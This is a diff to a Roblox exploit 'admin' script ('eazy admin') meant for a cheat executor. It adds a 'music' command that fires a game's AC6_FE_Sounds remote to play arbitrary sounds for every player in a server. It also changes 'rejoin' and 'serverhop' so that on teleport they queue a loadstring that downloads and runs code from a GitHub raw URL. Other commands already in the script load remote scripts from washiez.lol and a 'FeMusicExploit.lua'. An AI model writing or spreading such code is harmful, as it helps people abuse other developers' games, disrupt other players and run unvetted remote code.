@@ -1,8 +1,3 @@
-game.StarterGui:SetCore("SendNotification", {
-	Title = "eazy admin", 
-	Text = "loaded",
-	Duration = 5
-})
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
 Player:WaitForChild("PlayerGui")
@@ -32,7 +27,10 @@ end
 local Players = game:GetService("Players")
 local player = Player
 local UserInputService = game:GetService("UserInputService")
-
+local existingGui = Player:FindFirstChild("PlayerGui") and Player.PlayerGui:FindFirstChild("eazy-admin")
+if existingGui then
+	existingGui:Destroy()
+end
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "eazy-admin"
 ScreenGui.ResetOnSpawn = false
@@ -79,6 +77,35 @@ local function processCommand(msg)
 	local cmd = args[1]
 	if isCmd(cmd, {"save"}) then
 		saveinstance()
+	elseif isCmd(cmd, {"music"}) then
+		function splitArgs(str)
+			local args = {}
+			for word in string.gmatch(str, "%S+") do
+				table.insert(args, word)
+			end
+			return args
+		end
+		local function findRemoteEvent(name)
+			local replicatedStorage = game:GetService("ReplicatedStorage")
+			local workspace = game:GetService("Workspace")
+			for _, parent in ipairs({replicatedStorage, workspace}) do
+				for _, child in ipairs(parent:GetDescendants()) do
+					if child:IsA("RemoteEvent") and child.Name == name then
+						return child
+					end
+				end
+			end
+			return nil
+		end
+
+		local remote = findRemoteEvent("AC6_FE_Sounds")
+		local args = splitArgs(msg)
+		local assetId = "rbxassetid://" .. (args[2] or "0")
+		local randomName = "Sound_" .. tostring(math.random(100000, 999999))
+		local pitch = 1
+		local volume = 1
+		remote:FireServer("newSound", randomName, workspace, assetId, pitch, volume, false)
+		remote:FireServer("playSound", randomName)
 	elseif isCmd(cmd, {"suicidegun"}) then
 		-- made by bobby
 		local ReplicatedStorage = game.ReplicatedStorage
@@ -1185,9 +1212,39 @@ local function processCommand(msg)
 	elseif isCmd(cmd, {"washiez"}) then
 		loadstring(game:HttpGet('https://washiez.lol/script.lua'))()
 	elseif isCmd(cmd, {"rejoin"}) then
-		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
+		local TeleportService = game:GetService("TeleportService")
+		local Players = game:GetService("Players")
+		local LocalPlayer = Players.LocalPlayer
+		queue_on_teleport([[
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/EazyEv15/rtfsrtgsjke6sfue5iwfy6ia/refs/heads/main/s"))()
+	]])
+		TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
 	elseif isCmd(cmd, {"serverhop"}) then
-		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Player)
+		local TeleportService = game:GetService("TeleportService")
+		local HttpService = game:GetService("HttpService")
+		local Players = game:GetService("Players")
+		local LocalPlayer = Players.LocalPlayer
+		queue_on_teleport([[
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/EazyEv15/rtfsrtgsjke6sfue5iwfy6ia/refs/heads/main/s"))()
+]])
+
+		local function serverHop()
+			local success, result = pcall(function()
+				return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100"))
+			end)
+
+			if success and result and result.data then
+				for _, server in ipairs(result.data) do
+					if server.playing < server.maxPlayers and server.id ~= game.JobId then
+						TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
+						return
+					end
+				end
+			end
+
+			warn("No suitable server found to hop to.")
+		end
+		serverHop()
 	elseif isCmd(cmd, {"ac6"}) then
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/my-Garbage/refs/heads/main/FeMusicExploit.lua"))()
 	elseif isCmd(cmd, {"quirkycmd"}) then
@@ -2748,3 +2805,8 @@ end)
 Player.Chatted:Connect(function(msg)
 	processCommand(msg)
 end)
+game.StarterGui:SetCore("SendNotification", {
+	Title = "eazy admin", 
+	Text = "loaded",
+	Duration = 5
+})
